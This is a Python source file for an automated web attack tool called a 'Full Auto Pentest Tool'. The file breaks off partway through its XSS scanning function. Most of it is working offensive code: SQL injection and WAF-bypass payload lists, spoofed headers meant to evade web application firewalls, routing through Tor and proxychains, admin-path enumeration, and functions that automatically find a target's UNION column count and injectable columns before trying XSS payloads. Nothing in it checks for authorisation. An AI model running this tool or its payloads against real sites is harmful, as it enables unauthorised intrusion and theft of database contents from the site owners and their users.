#!/usr/bin/env python3
# ================================================================
# Full Auto Pentest Tool - Complete Working Version
# Author: Hydra Strozzz
# Version: 3.0 (Enhanced with fixes)
# ================================================================

import os
import sys
import re
import time
import json
import random
import shutil
import signal
import urllib
import urllib.request
import urllib.error
import urllib.parse
import subprocess
import socket
import ssl
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    os.system('pip install colorama requests')
    import requests
    from colorama import init, Fore, Back, Style
    init(autoreset=True)

# ============================================================
# CONSTANTS
# ============================================================

AUTHOR = "Hydra Strozzz"
VERSION = "3.0"
BOLD = Style.BRIGHT
NC = Style.RESET_ALL
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
CYAN = Fore.CYAN
MAGENTA = Fore.MAGENTA
WHITE = Fore.WHITE

# ============================================================
# USER AGENTS
# ============================================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

# ============================================================
# SQL ERROR PATTERNS
# ============================================================

SQL_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_.*",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"MySqlException",
    r"ORA-[0-9]{5}",
    r"Oracle error",
    r"PostgreSQL.*ERROR",
    r"Warning.*\Wpg_.*",
    r"valid PostgreSQL result",
    r"SQLite/JDBCDriver",
    r"SQLite.Exception",
    r"System.Data.SQLite.SQLiteException",
    r"Warning.*sqlite_.*",
    r"valid SQLite result",
    r"Microsoft OLE DB Provider for ODBC Drivers",
    r"Microsoft OLE DB Provider for SQL Server",
    r"Driver.*SQL Server",
    r"SQLServer JDBC Driver",
    r"com.microsoft.sqlserver",
    r"Unclosed quotation mark",
    r"Microsoft JET Database Engine",
    r"Access Database Engine",
    r"ODBC Microsoft Access",
    r"DB2 SQL Error",
    r"DB2Exception",
    r"com.ibm.db2",
    r"Informix.*SQL Error",
    r"com.informix.jdbc",
    r"Sybase.*SQL Error",
    r"com.sybase.jdbc",
    r"Adaptive Server Enterprise",
    r"SQLSTATE",
    r"Syntax error",
    r"Unknown column",
    r"Table '.*' doesn't exist",
    r"Column count doesn't match",
    r"Duplicate entry",
    r"Data truncated",
    r"Invalid query",
    r"Database error",
    r"Database connection",
    r"PDOException",
    r"mysqli_sql_exception",
    r"SQLException",
    r"DB Error",
]

# ============================================================
# WAF SIGNATURES
# ============================================================

WAF_SIGNATURES = {
    "Cloudflare": {
        "headers": ["CF-RAY", "Server: cloudflare"],
        "body": ["cf-ray", "cloudflare"]
    },
    "ModSecurity": {
        "headers": ["X-Mod-Security", "Sec-WebSocket-Protocol"],
        "body": ["mod_security", "ModSecurity"]
    },
    "AWS WAF": {
        "headers": ["X-Amzn-RequestId", "X-Amzn-Trace-Id"],
        "body": ["x-amzn-requestid"]
    },
    "Akamai": {
        "headers": ["X-Akamai-Transformed", "Server: Akamai"],
        "body": ["akamai"]
    },
    "Imperva": {
        "headers": ["X-Protected-By", "Server: Secure"],
        "body": ["incapsula", "imperva"]
    },
    "F5 BIG-IP": {
        "headers": ["X-Cnection", "X-Forwarded-For"],
        "body": ["BIG-IP", "F5"]
    },
    "Sucuri": {
        "headers": ["X-Sucuri-ID", "Server: Sucuri"],
        "body": ["sucuri"]
    },
    "Barracuda": {
        "headers": ["X-Barracuda", "Server: Barracuda"],
        "body": ["barracuda"]
    },
}

# ============================================================
# WAF BYPASS HEADERS
# ============================================================

WAF_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Forwarded-Server": "localhost"},
    {"X-HTTP-Method-Override": "GET"},
    {"X-HTTP-Method": "GET"},
    {"X-Method-Override": "GET"},
    {"Accept-Encoding": "gzip, deflate"},
    {"Accept-Charset": "utf-8"},
    {"Accept-Language": "en-US,en;q=0.9"},
    {"Cache-Control": "no-cache, no-store, must-revalidate"},
    {"Pragma": "no-cache"},
    {"Referer": "https://www.google.com/"},
    {"Origin": "https://www.google.com"},
]

# ============================================================
# ADMIN PATHS (Increased, full list)
# ============================================================

ADMIN_PATHS = [
    "/admin", "/administrator", "/adminpanel", "/admin-area",
    "/admin_area", "/adm", "/cp", "/controlpanel", "/dashboard",
    "/management", "/manage", "/panel", "/pages/admin",
    "/wp-admin", "/administrator", "/admin/login",
    "/user/login", "/login", "/log-in", "/signin",
    "/sign-in", "/auth", "/authenticate",
    "/backend", "/backoffice", "/webadmin", "/sysadmin",
    "/secure", "/security", "/private",
    "/portal", "/cpanel", "/whm", "/directadmin",
    "/plesk", "/ispconfig", "/vesta",
    "/dev", "/developer", "/devpanel",
    "/api/admin", "/graphql", "/swagger",
    "/cms", "/config", "/configuration",
    "/setup", "/install", "/wizard",
    "/server-status", "/server-info",  # kept but we'll filter later
    "/phpmyadmin", "/pma", "/mysql-admin",
    "/pgadmin", "/adminer",
    "/admin.php", "/admin.jsp", "/admin.aspx",
    "/login.php", "/login.jsp", "/login.aspx",
    "/admin/index.php", "/admin/login.php",
    "/admin/dashboard.php", "/admin/cpanel.php",
    # Extra from cloudscraper list
    "/siteadmin", "/site-admin", "/webmaster", "/staff", "/operator",
    "/moderator", "/superadmin", "/root", "/sysop", "/control",
    "/administration", "/admins", "/admincp", "/acp", "/scp",
    "/filemanager", "/files", "/logs", "/tmp", "/backup", "/sql",
]

# ============================================================
# COMMON PORTS
# ============================================================

COMMON_PORTS = [21, 22, 23, 25, 53, 80, 81, 110, 111, 135, 139, 143, 443, 445, 465, 514, 587, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080, 8443, 27017]

# ============================================================
# DIRECTORY FUZZING WORDLIST
# ============================================================

FUZZ_WORDLIST = [
    "admin", "backup", "config", "css", "dev", "files", "images", "includes", 
    "js", "lib", "logs", "media", "old", "php", "plugins", "private", "public",
    "scripts", "sql", "src", "test", "tmp", "uploads", "var", "www",
    "wp-content", "wp-includes", "wp-admin", "wp-json", "xmlrpc.php",
    "robots.txt", "sitemap.xml", "backup.zip", "backup.sql", "config.php",
    "index.php", "login.php", "admin.php", "db.php", "settings.php",
]

# ============================================================
# UTILITY FUNCTIONS
# ============================================================

def print_info(msg):
    print(f"{CYAN}[I] {msg}{NC}")

def print_good(msg):
    print(f"{GREEN}[+] {msg}{NC}")

def print_warn(msg):
    print(f"{YELLOW}[!] {msg}{NC}")

def print_error(msg):
    print(f"{RED}[-] {msg}{NC}")

def print_section(title):
    width = 65
    print(f"\n{BLUE}{'='*width}{NC}")
    print(f"{BLUE}| {title:<{width-3}}|{NC}")
    print(f"{BLUE}{'='*width}{NC}")

def get_random_ua():
    return random.choice(USER_AGENTS)

def is_url_alive(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": get_random_ua()})
        resp = urllib.request.urlopen(req, timeout=timeout)
        return resp.getcode()
    except:
        return None

def extract_domain(url):
    parsed = urllib.parse.urlparse(url)
    return parsed.netloc or parsed.path.split("/")[0]

# --- Helper to detect fake 200 pages that are actually errors ---
def is_fake_200(body, status):
    """Return True if the body indicates a 404/error despite status 200."""
    if status != 200:
        return False
    body_lower = body.lower()
    # Common error indicators
    error_patterns = [
        "404 not found", "page not found", "not found", "the requested url was not found",
        "does not exist", "no page found", "error 404", "404 error", "404 - not found",
        "404 not found", "404 page", "page could not be found", "we couldn't find that",
        "sorry, that page doesn't exist", "404", "not found on this server",
        "the requested page does not exist", "file not found"
    ]
    for p in error_patterns:
        if p in body_lower:
            return True
    # Check for typical 404 title
    if "<title>404" in body or "<title>Not Found" in body or "<title>Error 404" in body:
        return True
    # Check for very short responses (common for 404 pages)
    if len(body) < 100 and ("404" in body or "not found" in body_lower):
        return True
    return False

def get_response(url, timeout=10):
    """Return (status, headers, body) with fake-200 detection."""
    try:
        req = urllib.request.Request(url, headers={"User-Agent": get_random_ua()})
        resp = urllib.request.urlopen(req, timeout=timeout)
        status = resp.getcode()
        headers = dict(resp.headers)
        body = resp.read().decode('utf-8', errors='ignore')
        if status == 200 and is_fake_200(body, status):
            # Treat as 404
            return 404, headers, body
        return status, headers, body
    except urllib.error.HTTPError as e:
        status = e.code
        try:
            body = e.read().decode('utf-8', errors='ignore')
        except:
            body = ""
        headers = dict(e.headers) if hasattr(e, 'headers') else {}
        return status, headers, body
    except Exception:
        return None, None, None

TOR_RUNNING = False
PROXYCHAINS_AVAILABLE = False

def check_tor_status():
    global TOR_RUNNING
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex(('127.0.0.1', 9050))
        sock.close()
        TOR_RUNNING = (result == 0)
        return TOR_RUNNING
    except:
        TOR_RUNNING = False
        return False

def start_tor():
    try:
        subprocess.Popen(["tor", "--quiet"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        return check_tor_status()
    except:
        return False

def check_proxychains():
    global PROXYCHAINS_AVAILABLE
    PROXYCHAINS_AVAILABLE = bool(shutil.which("proxychains"))
    return PROXYCHAINS_AVAILABLE

def get_proxychains_cmd():
    if PROXYCHAINS_AVAILABLE:
        return ["proxychains"]
    return []

def show_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{GREEN}")
    banner_lines = [
        "______ _      _          _____                  ",
        "|  _  \(_)    | |        /  ___|                 ",
        "| | | | _ _ __| |_ _   _ \ `--.  ___  __ _ _ __  ",
        "| | | || | '__| __| | | | `--. \/ __|/ _` | '_ \ ",
        "| |/ / | | |  | |_| |_| |/\__/ / (__| (_| | | | |",
        "|___/  |_|_|   \__|\__, |\____/ \___|\__,_|_| |_|",
        "                    __/ |                        ",
        "                   |___/                         "
    ]
    for line in banner_lines:
        print(f"{GREEN}{line}{NC}")
    print(f"{YELLOW}  [+] Author : {AUTHOR}{NC}")
    print(f"{YELLOW}  [+] Version: {VERSION}{NC}")
    print(f"{YELLOW}  [+] Mode   : Full Auto Pentest{NC}")
    check_tor_status()
    check_proxychains()
    if TOR_RUNNING:
        print(f"{GREEN}  [+] Tor     : RUNNING{NC}")
    if PROXYCHAINS_AVAILABLE:
        print(f"{GREEN}  [+] Proxy   : AVAILABLE{NC}")
    print(f"{GREEN}  [+] Status  : Ready{NC}")
    print()

# ============================================================
# REQUIREMENTS CHECK
# ============================================================

def check_install_requirements():
    print_section(" Checking Requirements ")
    required_pkgs = ["requests", "colorama"]
    pip_paths = [
        shutil.which("pip"), shutil.which("pip3"),
        "/data/data/com.termux/files/usr/bin/pip",
        "/data/data/com.termux/files/usr/bin/pip3",
        "/usr/bin/pip", "/usr/bin/pip3"
    ]
    pip_cmd = None
    for p in pip_paths:
        if p and os.path.exists(p):
            pip_cmd = p
            break
    if not pip_cmd:
        pip_cmd = [sys.executable, "-m", "pip"]
    for pkg in required_pkgs:
        try:
            __import__(pkg.replace("-", "_"))
            print_good(f"{pkg} already installed")
        except ImportError:
            print_info(f"Installing {pkg}...")
            try:
                if isinstance(pip_cmd, list):
                    subprocess.check_call(pip_cmd + ["install", pkg, "-q"])
                else:
                    subprocess.check_call([pip_cmd, "install", pkg, "-q"])
                print_good(f"{pkg} installed successfully")
            except:
                print_warn(f"Could not install {pkg}")
    if shutil.which("sqlmap"):
        print_good("sqlmap found")
    else:
        print_warn("sqlmap not found - run: apt install sqlmap")
    if shutil.which("nikto"):
        print_good("nikto found")
    else:
        print_warn("nikto not found - run: apt install nikto")
    if shutil.which("nmap"):
        print_good("nmap found")
    else:
        print_warn("nmap not found")
    print()

# ============================================================
# WAF BYPASS PAYLOADS SQLI
# ============================================================

WAF_BYPASS_PAYLOADS_SQLI = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "' OR 1=1--",
    "' OR 1=1#",
    "' AND 1=1--",
    "' AND 1=2--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,2,3,4--",
    "' UNION SELECT 1,database(),3--",
    "' UNION SELECT 1,version(),3--",
    "' UNION SELECT 1,user(),3--",
    "' AND SLEEP(5)--",
    "' AND SLEEP(10)--",
    "' AND BENCHMARK(5000000,MD5(1))--",
]

# ============================================================
# EXPANDED WAF BYPASS TECHNIQUES (SQL)
# ============================================================

WAF_BYPASS_TECHNIQUES_SQL = [
    {"name": "Comment Injection", "payload": "'/**/OR/**/'1'='1"},
    {"name": "Comment UNION", "payload": "'/**/UNION/**/SELECT/**/1,2,3-- -"},
    {"name": "Case Variation", "payload": "'/**/UnIoN/**/SeLeCt/**/1,2,3-- -"},
    {"name": "Double URL Encoding", "payload": "%25%32%37%20%4F%52%20%27%31%27%3D%27%31"},
    {"name": "Hex Encoding", "payload": "' OR 0x313d31-- -"},
    {"name": "Null Byte", "payload": "%00' OR '1'='1"},
    {"name": "Buffer Overflow", "payload": "' OR '1'='1" + "A" * 5000},
    {"name": "HPP", "payload": "id=1&id=1' OR '1'='1"},
    {"name": "Whitespace Bypass", "payload": "'%09OR%0A'1'='1"},
    {"name": "Scientific Notation", "payload": "' OR 1e0=1e0-- -"},
    {"name": "Backtick Bypass", "payload": "' OR `1`=`1`-- -"},
    {"name": "Newline Injection", "payload": "'%0AOR%0A'1'='1"},
    {"name": "No Equal", "payload": "' OR '1'LIKE'1'-- -"},
    {"name": "Negative Value", "payload": "' OR '-1'='-1"},
    {"name": "Comparison Operator", "payload": "' OR 1>0-- -"},
    {"name": "Modulo Bypass", "payload": "' OR 1%2=1-- -"},
    {"name": "Pipe OR", "payload": "' || '1'='1"},
    {"name": "Ampersand AND", "payload": "' && '1'='1"},
    {"name": "No Quotes", "payload": "' OR 1=1-- -"},
    {"name": "CHAR Function", "payload": "' OR 1=CHAR(49)-- -"},
    {"name": "Like Operator", "payload": "' OR '1' LIKE '1"},
    {"name": "Between Operator", "payload": "' OR 1 BETWEEN 0 AND 2-- -"},
    {"name": "In Operator", "payload": "' OR 1 IN (1)-- -"},
    {"name": "Not Operator", "payload": "' OR NOT 1=2-- -"},
    {"name": "XOR Operator", "payload": "' OR 1 XOR 1-- -"},
    {"name": "Div Operator", "payload": "' OR 1 DIV 1-- -"},
    {"name": "True Constant", "payload": "' OR true-- -"},
    {"name": "Versioned Comment", "payload": "'/*!OR*/'1'='1"},
    {"name": "Optimizer Hint", "payload": "' /**/+ '1'='1"},
    # Additional
    {"name": "Multi-Comment", "payload": "'/**/OR/**/1=1/**/-- -"},
    {"name": "Mixed Case", "payload": "' oR 1=1-- -"},
    {"name": "Double Comment", "payload": "'/*!50000OR*/1=1-- -"},
    {"name": "Encoded NULL", "payload": "'%20%4f%52%20%27%31%27%3d%27%31"},
    {"name": "MySQL XOR", "payload": "' ^ 0=0-- -"},
    {"name": "PostgreSQL Double Pipe", "payload": "' || '1'='1"},
    {"name": "MS SQL Comment", "payload": "'/**/OR/**/'1'='1"},
    {"name": "Oracle Identifier", "payload": "' OR '1'='1'--"},
    {"name": "Tab Separation", "payload": "'\tOR\t'1'='1"},
    {"name": "Line Feed", "payload": "'\nOR\n'1'='1"},
    {"name": "Carriage Return", "payload": "'\rOR\r'1'='1"},
    {"name": "Parameter Pollution with Encoding", "payload": "id=1%00' OR '1'='1"},
    {"name": "JSON Obfuscation", "payload": '{"id":"1\' OR \'1\'=\'1"}'},
    {"name": "XML Encoded", "payload": "&#39; OR &#39;1&#39;=&#39;1"},
    {"name": "Umlaut Bypass", "payload": "’ OR ’1’=’1"},
    {"name": "Quote Escape", "payload": "\\' OR '1'='1"},
    {"name": "No Space", "payload": "'OR'1'='1"},
    {"name": "Multiline", "payload": "'\nOR\n'1'='1'--"},
    {"name": "Case Shift with Functions", "payload": "' uNIoN sElEcT 1,2,3-- -"},
    {"name": "Hex Function", "payload": "' OR unhex('313d31')-- -"},
    {"name": "Concat Bypass", "payload": "' OR CONCAT('1','=','1')-- -"},
    {"name": "If Condition", "payload": "' OR IF(1=1,1,0)-- -"},
    {"name": "Case When", "payload": "' OR CASE WHEN 1=1 THEN 1 ELSE 0 END-- -"},
    {"name": "Decimal Encoding", "payload": "' OR 1=1.0-- -"},
    {"name": "Exponent", "payload": "' OR 1=1e0-- -"},
    {"name": "Bitwise", "payload": "' OR 1|0=1-- -"},
    {"name": "Not Equal", "payload": "' OR 1<>0-- -"},
    {"name": "Less/Greater", "payload": "' OR 1>0-- -"},
]

# ============================================================
# WAF DETECTION
# ============================================================

def detect_waf(url):
    print_section(" WAF Detection ")
    print_info(f"Target: {url}")
    detected_wafs = []
    try:
        req = urllib.request.Request(url, headers={"User-Agent": get_random_ua()})
        resp = urllib.request.urlopen(req, timeout=15)
        headers = dict(resp.headers)
        body = resp.read().decode('utf-8', errors='ignore').lower()
        for waf_name, sigs in WAF_SIGNATURES.items():
            found = False
            for h in sigs["headers"]:
                if h.lower() in [k.lower() for k in headers.keys()]:
                    found = True
                    break
            if not found:
                for b_pattern in sigs["body"]:
                    if b_pattern.lower() in body:
                        found = True
                        break
            if found:
                detected_wafs.append(waf_name)
                print_good(f"WAF Detected: {waf_name}")
        test_url = url + ("?" if "?" not in url else "&") + "id=1' UNION SELECT * FROM users--"
        try:
            malicious_req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
            malicious_resp = urllib.request.urlopen(malicious_req, timeout=10)
            if malicious_resp.getcode() in [403, 406, 429, 503]:
                if not detected_wafs:
                    detected_wafs.append("Unknown WAF (blocked malicious payload)")
                    print_good("WAF Detected: Unknown WAF (blocked malicious payload)")
        except urllib.error.HTTPError as e:
            if e.code in [403, 406, 429, 503]:
                if not detected_wafs:
                    detected_wafs.append("Unknown WAF")
                    print_good(f"WAF Detected: Unknown WAF (HTTP {e.code})")
                else:
                    print_info(f"WAF triggered: HTTP {e.code}")
        except:
            pass
        if not detected_wafs:
            print_info("No WAF detected")
            return None
        else:
            return detected_wafs
    except Exception as e:
        print_error(f"Error detecting WAF: {str(e)}")
        return None

# ============================================================
# AUTO WAF BYPASS (ENHANCED - shows technique names)
# ============================================================

def auto_waf_bypass(url):
    print_section(" Automatic WAF Bypass ")
    if "?" not in url:
        print_warn("No parameters to test for bypass")
        return False, None
    base_url = url.split("?")[0]
    params_part = url.split("?")[1]
    params = params_part.split("&") if params_part else []
    successful_bypass = False
    bypass_method = None
    waf_detected = detect_waf(url)
    if not waf_detected:
        print_info("No WAF detected. Bypass not needed.")
        return True, "No WAF"
    print_info(f"WAF detected: {', '.join(waf_detected)}")
    print_info(f"Attempting {len(WAF_BYPASS_TECHNIQUES_SQL)} bypass techniques...")
    # Phase 1: Header-based bypass
    print_info("Phase 1: Header-based bypass techniques...")
    for bypass_header in WAF_BYPASS_HEADERS:
        for param in params:
            key = param.split("=")[0] if "=" in param else param
            test_url = f"{base_url}?{key}=1' OR '1'='1"
            try:
                ua = get_random_ua()
                headers = {"User-Agent": ua}
                headers.update(bypass_header)
                req = urllib.request.Request(test_url, headers=headers)
                resp = urllib.request.urlopen(req, timeout=10)
                if resp.getcode() == 200:
                    body = resp.read().decode('utf-8', errors='ignore')
                    for pattern in SQL_ERROR_PATTERNS:
                        if re.search(pattern, body, re.IGNORECASE):
                            successful_bypass = True
                            bypass_method = f"Header: {list(bypass_header.keys())[0]}"
                            print_good(f"Bypass successful! Method: {bypass_method}")
                            return True, bypass_method
                    if len(body) > 100 or "error" in body.lower():
                        successful_bypass = True
                        bypass_method = f"Header: {list(bypass_header.keys())[0]}"
                        print_good(f"Bypass possible with header: {bypass_method}")
                        return True, bypass_method
            except urllib.error.HTTPError as e:
                if e.code not in [403, 406, 429, 503]:
                    successful_bypass = True
                    bypass_method = f"Header bypass (HTTP {e.code})"
                    print_good(f"Bypass with HTTP {e.code}")
                    return True, bypass_method
            except:
                continue
        if successful_bypass:
            break
    # Phase 2: Payload-based bypass with technique name printing
    if not successful_bypass:
        print_info("Phase 2: Payload-based bypass techniques...")
        for technique in WAF_BYPASS_TECHNIQUES_SQL:
            print_info(f"  Trying technique: {technique['name']}")
            for param in params:
                key = param.split("=")[0] if "=" in param else param
                if technique["name"] == "HPP":
                    test_url = f"{base_url}?{technique['payload']}&{key}=1"
                else:
                    test_url = f"{base_url}?{key}={urllib.parse.quote(technique['payload'])}"
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
                    resp = urllib.request.urlopen(req, timeout=10)
                    if resp.getcode() == 200:
                        body = resp.read().decode('utf-8', errors='ignore')
                        for pattern in SQL_ERROR_PATTERNS:
                            if re.search(pattern, body, re.IGNORECASE):
                                successful_bypass = True
                                bypass_method = technique["name"]
                                print_good(f"Bypass successful! Method: {bypass_method}")
                                return True, bypass_method
                        if "' OR '1'='1" in technique["payload"] and len(body) > 500:
                            successful_bypass = True
                            bypass_method = technique["name"]
                            print_good(f"Bypass possible with: {bypass_method}")
                            return True, bypass_method
                except urllib.error.HTTPError as e:
                    if e.code not in [403, 406, 429, 503]:
                        successful_bypass = True
                        bypass_method = f"{technique['name']} (HTTP {e.code})"
                        print_good(f"Partial bypass: {bypass_method}")
                        return True, bypass_method
                except:
                    continue
            if successful_bypass:
                break
    # Phase 3: User-Agent rotation
    if not successful_bypass:
        print_info("Phase 3: User-Agent rotation...")
        for ua in random.sample(USER_AGENTS, min(20, len(USER_AGENTS))):
            for param in params:
                key = param.split("=")[0] if "=" in param else param
                test_url = f"{base_url}?{key}=1' UNION SELECT 1,2,3-- -"
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": ua})
                    resp = urllib.request.urlopen(req, timeout=10)
                    if resp.getcode() == 200:
                        body = resp.read().decode('utf-8', errors='ignore')
                        for pattern in SQL_ERROR_PATTERNS:
                            if re.search(pattern, body, re.IGNORECASE):
                                successful_bypass = True
                                bypass_method = f"UA: {ua[:30]}..."
                                print_good(f"Bypass with User-Agent rotation!")
                                return True, bypass_method
                except:
                    continue
    if not successful_bypass:
        print_warn("All bypass techniques failed against this WAF")
    return successful_bypass, bypass_method

# ============================================================
# FIXED COLUMN DETECTION (descending from 100)
# ============================================================

def detect_columns_fixed(url):
    print_section(" Column Detection ")
    if "?" not in url:
        print_warn("No parameters found for column detection")
        return None, []
    base_url = url.split("?")[0]
    params_part = url.split("?")[1] if "?" in url else ""
    print_info("Detecting number of columns using ORDER BY and UNION techniques (descending from 100)...")
    max_columns = 0
    vulnerable_params = []
    param_pairs = []
    if "&" in params_part:
        for p in params_part.split("&"):
            key = p.split("=")[0] if "=" in p else p
            param_pairs.append(key)
    else:
        key = params_part.split("=")[0] if "=" in params_part else params_part
        param_pairs.append(key)
    for param in param_pairs:
        print_info(f"Testing parameter: {param}")
        # Try from 100 down to 1
        for cols in range(100, 0, -1):
            test_url = f"{base_url}?{param}=1' ORDER BY {cols}-- -"
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
                resp = urllib.request.urlopen(req, timeout=10)
                body = resp.read().decode('utf-8', errors='ignore')
                # If no error, that means ORDER BY {cols} is valid, so max_columns >= cols
                if "Unknown column" not in body and "order by" not in body.lower()[:200]:
                    max_columns = cols
                    # We found the maximum (since descending), break
                    break
                else:
                    # If error, then cols is too high, continue descending
                    continue
            except urllib.error.HTTPError as e:
                if e.code in [500, 404]:
                    # Often error means invalid column, so continue
                    continue
                elif e.code in [403, 406, 503]:
                    # WAF blocking, try bypass headers
                    bypass_worked = False
                    for bh in random.sample(WAF_BYPASS_HEADERS, 5):
                        h = {"User-Agent": get_random_ua()}
                        h.update(bh)
                        try:
                            req2 = urllib.request.Request(test_url, headers=h)
                            resp2 = urllib.request.urlopen(req2, timeout=10)
                            body2 = resp2.read().decode('utf-8', errors='ignore')
                            if "Unknown column" not in body2:
                                max_columns = cols
                                bypass_worked = True
                                break
                            else:
                                continue
                        except:
                            continue
                    if not bypass_worked:
                        continue
                else:
                    # Other errors, assume column invalid
                    continue
            except:
                continue
            time.sleep(0.3)
        if max_columns > 0:
            vulnerable_params.append(param)
            print_good(f"Parameter '{param}' has {max_columns} columns (ORDER BY)")
        else:
            print_warn(f"Could not detect column count for parameter '{param}'")
    # If no parameter gave columns, try UNION SELECT NULL technique (descending)
    if max_columns == 0:
        print_info("ORDER BY failed. Trying UNION SELECT NULL technique (descending from 50)...")
        for param in param_pairs:
            for cols in range(50, 0, -1):
                nulls = ",".join(["NULL"] * cols)
                test_url = f"{base_url}?{param}=1' UNION SELECT {nulls}-- -"
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
                    resp = urllib.request.urlopen(req, timeout=10)
                    body = resp.read().decode('utf-8', errors='ignore')
                    if "Column count doesn't match" not in body and "has the same number" not in body:
                        max_columns = cols
                        vulnerable_params.append(param)
                        print_good(f"Parameter '{param}' has {max_columns} columns (UNION technique)")
                        break
                except urllib.error.HTTPError:
                    # Sometimes error indicates valid? We'll consider it positive if not a known error
                    max_columns = cols
                    vulnerable_params.append(param)
                    print_good(f"Parameter '{param}' has {max_columns} columns (UNION - error based)")
                    break
                except:
                    continue
            if max_columns > 0:
                break
    if max_columns == 0:
        print_warn("Could not detect column count automatically")
        return None, []
    print_good(f"Maximum columns detected: {max_columns}")
    return max_columns, vulnerable_params

# ============================================================
# VULNERABLE COLUMN FINDER (Improved)
# ============================================================

def find_vulnerable_columns(url, num_columns, params):
    print_section(" Vulnerable Column Detection ")
    if not num_columns or num_columns == 0:
        print_warn("No column count available")
        return None
    base_url = url.split("?")[0]
    vulnerable_cols = []
    print_info(f"Testing {num_columns} columns for string injection points...")
    for col_num in range(1, num_columns + 1):
        cols = []
        for i in range(1, num_columns + 1):
            if i == col_num:
                cols.append("'test'")
            else:
                cols.append("NULL")
        nulls = ",".join(cols)
        for param in params:
            test_url = f"{base_url}?{param}=1' UNION SELECT {nulls}-- -"
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
                resp = urllib.request.urlopen(req, timeout=10)
                body = resp.read().decode('utf-8', errors='ignore')
                if "test" in body:
                    vulnerable_cols.append(col_num)
                    print_good(f"Column {col_num} is injectable (string)")
                    break
            except urllib.error.HTTPError as e:
                if e.code == 200:
                    try:
                        body = e.read().decode('utf-8', errors='ignore')
                        if "test" in body:
                            vulnerable_cols.append(col_num)
                            print_good(f"Column {col_num} is injectable (string)")
                            break
                    except:
                        pass
                elif e.code not in [403, 406, 429]:
                    # Assume it might be injectable (or we can't test properly)
                    vulnerable_cols.append(col_num)
                    print_good(f"Column {col_num} may be injectable (HTTP {e.code})")
                    break
            except:
                continue
    if vulnerable_cols:
        print_good(f"Vulnerable columns: {vulnerable_cols}")
    else:
        print_warn("No vulnerable columns found")
    return vulnerable_cols if vulnerable_cols else None

# ============================================================
# FIXED XSS DETECTION
# ============================================================

def xss_scan_fixed(url):
    print_section(" XSS Scan ")
    if "?" not in url:
        print_warn("No parameters to test for XSS")
        return []
    base_url = url.split("?")[0]
    params_part = url.split("?")[1]
    params = params_part.split("&") if params_part else []
    XSS_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'><script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "\" autofocus onfocus=alert(1) x=\"",
        "';alert(String.fromCharCode(88,83,83));//",
        "\"-alert(1)-\"",
        "';-alert(1)-'",
        "<script>prompt(1)</script>",
        "<script>confirm(1)</script>",
        "<<SCRIPT>alert(1)</SCRIPT>",
        "<SCRIPT>alert(1);</SCRIPT>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<body onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<details/open/ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<isindex type=image src=1 onerror=alert(1)>",
        "javascript:alert(1)",
        "\"><svg/onload=alert(1)>",
        "'-alert(1)-'",
        "1\"><script>alert(1)</script>",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
    ]
    vulnerable = []
    for param in params:
        key = param.split("=")[0] if "=" in param else param
        print_info(f"Testing parameter: {key}")
        for payload in XSS_PAYLOADS:
            test_url = f"{base_url}?{key}={urllib.parse.quote(payload)}"
            try:
